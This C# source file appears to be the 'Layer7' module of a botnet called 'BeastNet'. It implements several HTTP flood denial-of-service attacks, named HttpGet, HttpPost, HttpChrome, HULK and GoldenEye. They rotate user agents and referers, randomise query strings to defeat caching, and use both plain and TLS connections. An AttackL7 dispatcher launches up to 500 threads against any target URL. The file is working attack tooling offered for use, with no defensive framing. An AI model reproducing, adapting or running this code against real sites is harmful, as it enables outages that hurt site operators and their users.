using System;
using System.Diagnostics;
using System.Net.Security;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Net;
using System.Web;

namespace BeastNet
{
    class Layer7
    {
        public static string RandomString(int size)
        {
            StringBuilder builder = new StringBuilder();
            Random random = new Random();
            char ch;
            for (int i = 0; i < size; i++)
            {
                ch = Convert.ToChar(Convert.ToInt32(Math.Floor(26 * random.NextDouble() + 65)));
                builder.Append(ch);
            }
            return builder.ToString();
        }

        static void HttpGet(string target, int time, int tick)
        {
            int port, rnd, rnd2;
            string request;
            string target_bak = target;
            if (target.Contains("https://"))
            {
                port = 443;
                target = target.Remove(0, 8);
            }
            else if (target.Contains("http://"))
            {
                port = 80;
                target = target.Remove(0, 7);
            }
            else
            {
                port = 80;
            }
            string get_host = "GET " + target_bak + " HTTP/1.1\r\nHost: " + target.Split('/')[0] + "\r\n";
            if (port == 443)
            {
                Random r = new Random();
                Stopwatch s = new Stopwatch();
                s.Start();
                while (s.Elapsed < TimeSpan.FromSeconds(time))
                {
                    try
                    {
                        rnd = r.Next(0, vars.UserAgents.Length - 1);
                        rnd2 = r.Next(0, vars.AcceptAll.Length - 1);
                        request = get_host + "User-Agent: " + vars.UserAgents[rnd] + "\r\n" + vars.AcceptAll[rnd2] + "Connection: Keep-Alive\r\n\r\n";
                        TcpClient tc = new TcpClient();
                        tc.SendTimeout = 10000;
                        SslStream sslStream;
                        while (true)
                        {
                            try
                            {
                                tc.Connect(target.Split('/')[0], port);
                                break;
                            }
                            catch { }
                        }
                        sslStream = new SslStream(tc.GetStream());
                        sslStream.AuthenticateAsClient(target.Split('/')[0]);
                        byte[] buff = Encoding.ASCII.GetBytes(request);
                        sslStream.Write(buff, 0, buff.Length);
                        sslStream.Close();
                        tc.Close();
                        Thread.Sleep(tick);
                    }
                    catch { }
                }
                s.Stop();
            }
            else if (port == 80)
            {
                Random r = new Random();
                Stopwatch s = new Stopwatch();
                s.Start();
                while (s.Elapsed < TimeSpan.FromSeconds(time))
                {
                    try
                    {
                        rnd = r.Next(0, vars.UserAgents.Length - 1);
                        rnd2 = r.Next(0, vars.AcceptAll.Length - 1);
                        request = get_host + "User-Agent: " + vars.UserAgents[rnd] + "\r\n" + vars.AcceptAll[rnd2] + "Connection: Keep-Alive\r\n\r\n";
                        TcpClient tc = new TcpClient();
                        while (true)
                        {
                            try
                            {
                                tc.Connect(target.Split('/')[0], port);
                                break;
                            }
                            catch { }
                        }
                        tc.SendTimeout = 10000;
                        byte[] buff = Encoding.ASCII.GetBytes(request);
                        NetworkStream stream = tc.GetStream();
                        stream.Write(buff, 0, buff.Length);
                        stream.Close();
                        tc.Close();
                        Thread.Sleep(tick);
                    }
                    catch { }
                }
                s.Stop();
            }
        }

        static void HttpChrome(string target, int time, int tick)
        {
            int port, rnd;
            string request;
            string target_bak = target;
            if (target.Contains("https://"))
            {
                port = 443;
                target = target.Remove(0, 8);
            }
            else if (target.Contains("http://"))
            {
                port = 80;
                target = target.Remove(0, 7);
            }
            else
            {
                port = 80;
            }
            Random r = new Random();
            string get_host;
            if (port == 443)
            {
                Stopwatch s = new Stopwatch();
                s.Start();
                while (s.Elapsed < TimeSpan.FromSeconds(time))
                {
                    try
                    {
                        rnd = r.Next(0, vars.UserAgents.Length - 1);
                        get_host = "GET " + target_bak + " HTTP/1.1\r\nHost: " + target.Split('/')[0] + "\r\nConnection: keep-alive\r\nPragma: no-cache\r\nCache-Control: no-cache\r\nDNT: 1\r\nUpgrade-Insecure-Requests: 1\r\nUser-Agent: " + vars.UserAgents[rnd] + "\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7,de;q=0.6,ar;q=0.5,pt;q=0.4,ja;q=0.3,fr;q=0.2\r\n\r\n";
                        request = get_host;
                        TcpClient tc = new TcpClient();
                        tc.SendTimeout = 10000;
                        SslStream sslStream;
                        while (true)
                        {
                            try
                            {
                                tc.Connect(target.Split('/')[0], port);
                                break;
                            }
                            catch { }
                        }
                        sslStream = new SslStream(tc.GetStream());
                        sslStream.AuthenticateAsClient(target.Split('/')[0]);
                        byte[] buff = Encoding.ASCII.GetBytes(request);
                        sslStream.Write(buff, 0, buff.Length);
                        sslStream.Close();
                        tc.Close();
                        Thread.Sleep(tick);
                    }
                    catch { }
                }
                s.Stop();
            }
            else if (port == 80)
            {
                Stopwatch s = new Stopwatch();
                s.Start();
                while (s.Elapsed < TimeSpan.FromSeconds(time))
                {
                    try
                    {
                        rnd = r.Next(0, vars.UserAgents.Length - 1);
                        get_host = "GET " + target_bak + " HTTP/1.1\r\nHost: " + target.Split('/')[0] + "\r\nConnection: keep-alive\r\nPragma: no-cache\r\nCache-Control: no-cache\r\nDNT: 1\r\nUpgrade-Insecure-Requests: 1\r\nUser-Agent: " + vars.UserAgents[rnd] + "\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7,de;q=0.6,ar;q=0.5,pt;q=0.4,ja;q=0.3,fr;q=0.2\r\n\r\n";
                        request = get_host;
                        TcpClient tc = new TcpClient();
                        while (true)
                        {
                            try
                            {
                                tc.Connect(target.Split('/')[0], port);
                                break;
                            }
                            catch { }
                        }
                        tc.SendTimeout = 10000;
                        byte[] buff = Encoding.ASCII.GetBytes(request);
                        NetworkStream stream = tc.GetStream();
                        stream.Write(buff, 0, buff.Length);
                        stream.Close();
                        tc.Close();
                        Thread.Sleep(tick);
                    }
                    catch { }
                }
                s.Stop();
            }
        }


        static void HttpPost(string target, int time, int tick)
        {
            int port, rnd, rnd2;
            string request;
            string target_bak = target;
            if (target.Contains("https://"))
            {
                port = 443;
                target = target.Remove(0, 8);
            }
            else if (target.Contains("http://"))
            {
                port = 80;
                target = target.Remove(0, 7);
            }
            else
            {
                port = 80;
            }
            string get_host = "POST " + target_bak + " HTTP/1.1\r\nHost: " + target.Split('/')[0] + "\r\n";
            if (port == 443)
            {
                Random r = new Random();
                Stopwatch s = new Stopwatch();
                s.Start();
                while (s.Elapsed < TimeSpan.FromSeconds(time))
                {
                    try
                    {
                        rnd = r.Next(0, vars.UserAgents.Length - 1);
                        rnd2 = r.Next(0, vars.AcceptAll.Length - 1);
                        request = get_host + "User-Agent: " + vars.UserAgents[rnd] + "\r\n" + vars.AcceptAll[rnd2] + "Connection: Keep-Alive\r\n\r\n";
                        TcpClient tc = new TcpClient();
                        tc.SendTimeout = 10000;
                        SslStream sslStream;
                        while (true)
                        {
                            try
                            {
                                tc.Connect(target.Split('/')[0], port);
                                break;
                            }
                            catch { }
                        }
                        sslStream = new SslStream(tc.GetStream());
                        sslStream.AuthenticateAsClient(target.Split('/')[0]);
                        byte[] buff = Encoding.ASCII.GetBytes(request);
                        sslStream.Write(buff, 0, buff.Length);
                        sslStream.Close();
                        tc.Close();
                        Thread.Sleep(tick);
                    }
                    catch { }
                }
                s.Stop();
            }
            else if (port == 80)
            {
                Random r = new Random();
                Stopwatch s = new Stopwatch();
                s.Start();
                while (s.Elapsed < TimeSpan.FromSeconds(time))
                {
                    try
                    {
                        rnd = r.Next(0, vars.UserAgents.Length - 1);
                        rnd2 = r.Next(0, vars.AcceptAll.Length - 1);
                        request = get_host + "User-Agent: " + vars.UserAgents[rnd] + "\r\n" + vars.AcceptAll[rnd2] + "Connection: Keep-Alive\r\n\r\n";
                        TcpClient tc = new TcpClient();
                        while (true)
                        {
                            try
                            {
                                tc.Connect(target.Split('/')[0], port);
                                break;
                            }
                            catch { }
                        }
                        tc.SendTimeout = 10000;
                        byte[] buff = Encoding.ASCII.GetBytes(request);
                        NetworkStream stream = tc.GetStream();
                        stream.Write(buff, 0, buff.Length);
                        stream.Close();
                        tc.Close();
                        Thread.Sleep(tick);
                    }
                    catch { }
                }
                s.Stop();
            }
        }

        static void HttpHULK(string target, int time, int tick)
        {
            int port, rnd, rnd2;
            string request, param_joiner, get_host;
            string target_bak = target;
            if (target.Contains("https://"))
            {
                port = 443;
                target = target.Remove(0, 8);
            }
            else if (target.Contains("http://"))
            {
                port = 80;
                target = target.Remove(0, 7);
            }
            else
            {
                port = 80;
            }
            if (target.Contains("?"))
            {
                param_joiner = "&";
            }
            else
            {
                param_joiner = "?";
            }
            if (!target_bak[target_bak.Length - 1].Equals('/'))
            {
                target_bak += "/";
            }
            if (port == 443)
            {
                Random r = new Random();
                Stopwatch s = new Stopwatch();
                s.Start();
                while (s.Elapsed < TimeSpan.FromSeconds(time))
                {
                    try
                    {
                        rnd = r.Next(0, vars.UserAgents.Length - 1);
                        rnd2 = r.Next(0, vars.headersReferers.Length - 1);
                        get_host = "GET " + target_bak + param_joiner + RandomString(5) + "=" + RandomString(3) + " HTTP/1.1\r\nHost: " + target.Split('/')[0] + "\r\n";
                        request = get_host + "User-Agent: " + vars.UserAgents[rnd] + "\r\nCache-Control: no-cache\r\nAccept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\r\nReferer: " + vars.headersReferers[rnd2] + "\r\nConnection: Keep-Alive\r\nKeep-Alive: 120\r\nAccept-Encoding: gzip\r\n\r\n";
                        TcpClient tc = new TcpClient();
                        tc.SendTimeout = 10000;
                        SslStream sslStream;
                        while (true)
                        {
                            try
                            {
                                tc.Connect(target.Split('/')[0], port);
                                break;
                            }
                            catch { }
                        }
                        sslStream = new SslStream(tc.GetStream());
                        sslStream.AuthenticateAsClient(target.Split('/')[0]);
                        byte[] buff = Encoding.ASCII.GetBytes(request);
                        sslStream.Write(buff, 0, buff.Length);
                        sslStream.Close();
                        tc.Close();
                        Thread.Sleep(tick);
                    }
                    catch { }
                }
                s.Stop();
            }
            else if (port == 80)
            {
                Random r = new Random();
                Stopwatch s = new Stopwatch();
                s.Start();
                while (s.Elapsed < TimeSpan.FromSeconds(time))
                {
                    try
                    {
                        rnd = r.Next(0, vars.UserAgents.Length - 1);
                        rnd2 = r.Next(0, vars.headersReferers.Length - 1);
                        get_host = "GET " + target_bak + param_joiner + RandomString(5) + "=" + RandomString(3) + " HTTP/1.1\r\nHost: " + target.Split('/')[0] + "\r\n";
                        request = get_host + "User-Agent: " + vars.UserAgents[rnd] + "\r\nCache-Control: no-cache\r\nAccept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\r\nReferer: " + vars.headersReferers[rnd2] + "\r\nConnection: Keep-Alive\r\nKeep-Alive: 120\r\nAccept-Encoding: gzip\r\n\r\n";
                        TcpClient tc = new TcpClient();
                        while (true)
                        {
                            try
                            {
                                tc.Connect(target.Split('/')[0], port);
                                break;
                            }
                            catch { }
                        }
                        tc.SendTimeout = 10000;
                        byte[] buff = Encoding.ASCII.GetBytes(request);
                        NetworkStream stream = tc.GetStream();
                        stream.Write(buff, 0, buff.Length);
                        stream.Close();
                        tc.Close();
                        Thread.Sleep(tick);
                    }
                    catch { }
                }
                s.Stop();
            }
        }

        static void GoldenEye(string target, int time, int tick)
        {
            int port, rnd, rnd2;
            string request;
            string target_bak = target;
            if (target.Contains("https://"))
            {
                port = 443;
                target = target.Remove(0, 8);
            }
            else if (target.Contains("http://"))
            {
                port = 80;
                target = target.Remove(0, 7);
            }
            else
            {
                port = 80;
            }
            Random r = new Random();
            string get_host;
            if (port == 443)
            {
                Stopwatch s = new Stopwatch();
                s.Start();
                while (s.Elapsed < TimeSpan.FromSeconds(time))
                {
                    try
                    {
                        rnd = r.Next(0, vars.UserAgents.Length - 1);
                        rnd2 = r.Next(0, vars.UserAgents.Length - 1);
                        get_host = "GET " + target_bak + " HTTP/1.1\r\nUser-Agent: " + vars.UserAgents[rnd] + "\r\nCache-Control: no-cache\r\nAccept-Encoding: *, identity, gzip, deflate\r\nAccept-Charset: ISO-8859-1, utf-8, Windows-1251, ISO-8859-2, ISO-8859-15\r\nReferer: " + vars.headersReferers[rnd2] + "\r\nKeep-Alive: 20000\r\nConnection: keep-alive\r\nContent-Type: multipart/form-data, application/x-url-encoded\r\n\r\n";
                        request = get_host;
                        TcpClient tc = new TcpClient();
                        tc.SendTimeout = 10000;
                        SslStream sslStream;
                        while (true)
                        {
                            try
                            {
                                tc.Connect(target.Split('/')[0], port);
                                break;
                            }
                            catch { }
                        }
                        sslStream = new SslStream(tc.GetStream());
                        sslStream.AuthenticateAsClient(target.Split('/')[0]);
                        byte[] buff = Encoding.ASCII.GetBytes(request);
                        sslStream.Write(buff, 0, buff.Length);
                        sslStream.Close();
                        tc.Close();
                        Thread.Sleep(tick);
                    }
                    catch { }
                }
                s.Stop();
            }
            else if (port == 80)
            {
                Stopwatch s = new Stopwatch();
                s.Start();
                while (s.Elapsed < TimeSpan.FromSeconds(time))
                {
                    try
                    {
                        rnd = r.Next(0, vars.UserAgents.Length - 1);
                        get_host = "GET " + target_bak + " HTTP/1.1\r\nHost: " + target.Split('/')[0] + "\r\nConnection: keep-alive\r\nPragma: no-cache\r\nCache-Control: no-cache\r\nDNT: 1\r\nUpgrade-Insecure-Requests: 1\r\nUser-Agent: " + vars.UserAgents[rnd] + "\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7,de;q=0.6,ar;q=0.5,pt;q=0.4,ja;q=0.3,fr;q=0.2\r\n\r\n";
                        request = get_host;
                        TcpClient tc = new TcpClient();
                        while (true)
                        {
                            try
                            {
                                tc.Connect(target.Split('/')[0], port);
                                break;
                            }
                            catch { }
                        }
                        tc.SendTimeout = 10000;
                        byte[] buff = Encoding.ASCII.GetBytes(request);
                        NetworkStream stream = tc.GetStream();
                        stream.Write(buff, 0, buff.Length);
                        stream.Close();
                        tc.Close();
                        Thread.Sleep(tick);
                    }
                    catch { }
                }
                s.Stop();
            }
        }

        public static void AttackL7(string target, int thread, int time, int tick, int type)
        {
            switch (type)
            {
                case 0:
                    if (thread > 500)
                    {
                        thread = 500;
                    }

                    for (int i = 0; i < thread; i++)
                    {
                        Thread atk = new Thread(() => HttpGet(target, time, tick));
                        atk.Start();
                    }
                    break;
                case 1:
                    if (thread > 500)
                    {
                        thread = 500;
                    }

                    for (int i = 0; i < thread; i++)
                    {
                        Thread atk = new Thread(() => HttpPost(target, time, tick));
                        atk.Start();
                    }
                    break;
                case 2:
                    if (thread > 500)
                    {
                        thread = 500;
                    }

                    for (int i = 0; i < thread; i++)
                    {
                        Thread atk = new Thread(() => HttpHULK(target, time, tick));
                        atk.Start();
                    }
                    break;
                case 3:
                    if (thread > 500)
                    {
                        thread = 500;
                    }

                    for (int i = 0; i < thread; i++)
                    {
                        Thread atk = new Thread(() => HttpChrome(target, time, tick));
                        atk.Start();
                    }
                    break;
                case 4:
                    if (thread > 500)
                    {
                        thread = 500;
                    }

                    for (int i = 0; i < thread; i++)
                    {
                        Thread atk = new Thread(() => GoldenEye(target, time, tick));
                        atk.Start();
                    }
                    break;
            }
        }
    }
}
